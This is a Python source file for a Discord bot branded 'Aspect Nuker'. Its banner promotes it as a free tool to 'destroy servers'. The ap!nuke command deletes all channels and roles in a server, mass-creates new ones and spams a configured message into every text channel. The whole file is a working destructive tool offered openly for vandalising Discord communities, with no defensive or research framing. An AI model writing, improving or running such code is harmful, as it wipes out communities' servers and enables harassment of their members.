import discord
from discord.ext import commands
from dotenv import load_dotenv
load_dotenv()
import pystyle
import time
import os
import asyncio
import json

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")

prefix = "ap!"
intents = discord.Intents.all()
n = None
cfgFile = 'bin/config.json'

with open(cfgFile, 'r') as f:
    config = json.load(f)

b = pystyle.Colors.blue
p = pystyle.Colors.purple
g = pystyle.Colors.green
r = pystyle.Colors.red

bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=n)

def menu():
    text = """

    $$$$$$\                                            $$\     
    $$  __$$\                                           $$ |    
    $$ /  $$ | $$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$$\ $$$$$$\   
    $$$$$$$$ |$$  _____|$$  __$$\ $$  __$$\ $$  _____|\_$$  _|  
    $$  __$$ |\$$$$$$\  $$ /  $$ |$$$$$$$$ |$$ /        $$ |    
    $$ |  $$ | \____$$\ $$ |  $$ |$$   ____|$$ |        $$ |$$\ 
    $$ |  $$ |$$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\   \$$$$  |
    \__|  \__|\_______/ $$  ____/  \_______| \_______|   \____/ 
                        $$ |                                    
                        $$ |                                    
                        \__|                                    
"""

    print(pystyle.Center.XCenter(pystyle.Colorate.Vertical(pystyle.Colors.purple_to_blue, text)))
    time.sleep(1)

    menu = f"""

        {b}[Aspect Nuker ~ 2024]{p} Best free nuke tool currently out
        {b}[ap!nuke]{p} Use this command to destroy servers!
        {b}[Aspect Nuker ~ 2024]{p} Made by @cozmic.tech @ 12/15/2024

    """
    print(pystyle.Center.XCenter(menu))

    info = f"""

    ╭
    │{b}[+]{p} Username: {{ {bot.user} }}
    │
    │{b}[+]{p} Prefix: {{ {prefix} }} 
    │
    │{b}[+]{p} {{ made by aspect -  https://discord.gg/4PwxBqnXKu }}
    ╰

    """

    print(pystyle.Center.XCenter(info))

async def deleteChannel(channel):
    try:
        t1 = time.time()
        await channel.delete()
        t2 = time.time()
        print(f"{b}[+]{p} Channel {channel} successfully deleted in {t2 - t1:.2f} seconds!")
    except discord.Forbidden:
        print(f"{r}[-]{p} Could not delete channel!")
        return

async def deleteRole(role):
    if role.name == "@everyone" or role.managed:
        return
    
    try:
        t1 = time.time()
        await role.delete()
        t2 = time.time()
        print(f"{b}[+]{p} Role {role} successfully deleted in {t2 - t1:.2f} seconds!")
    except discord.Forbidden:
        print(f"{r}[-]{p} Could not delete role!")
        return

async def createChannel(guild):
    try:   
        name = config["channel_name"]
        t1 = time.time()
        channel = await guild.create_text_channel(name)
        t2 = time.time()
        print(f"{b}[+]{p} Channel {channel.name} created in {t2 - t1:.2f} seconds!")
    except discord.Forbidden:
        print(f"{r}[-]{p} Could not create channel!")
        return

    

async def createRole(guild):
    try:    
        name = config["role_name"]
        t1 = time.time()
        role = await guild.create_role(name=name)
        t2 = time.time()

        print(f"{b}[+]{p} Role {role.name} created in {t2 - t1:.2f} seconds!")
    except discord.Forbidden:
        print(f"{r}[-]{p} Could not create role!")
        return

async def sendMsg(channel, msg):
    try:
        t1 = time.time()
        await channel.send(msg)
        t2 = time.time()

        print(f"{b}[+]{p} Sent message '{msg}' in {t2 - t1:.2f} seconds!")
    except discord.Forbidden:
        print(f"{r}[-]{p} Could not send message!")
        return

@bot.command()
async def nuke(ctx):
    t1 = time.time()

    guild = ctx.guild
    await ctx.send(f"Okay daddy <@{ctx.author.id}>")

    dchnCommand = [deleteChannel(channel) for channel in guild.channels]
    await asyncio.gather(*dchnCommand)

    roleCommand = [deleteRole(role) for role in guild.roles]
    await asyncio.gather(*roleCommand)

    cchnCommand = [createChannel(guild) for _ in range(config["amount_of_channels"])]
    await asyncio.gather(*cchnCommand)

    croleCommand = [createRole(guild) for _ in range(config["role_count"])]
    await asyncio.gather(*croleCommand)

    msg = config["spam_message"]
    spamMsgCommand = [sendMsg(channel, msg) for channel in guild.channels if isinstance(channel, discord.TextChannel)]
    await asyncio.gather(*spamMsgCommand)

    t2 = time.time()
    print(f"{b}[+]{p} Nuke has ended after {t2 - t1:.2f} seconds!")

menu()
bot.run(DISCORD_TOKEN)
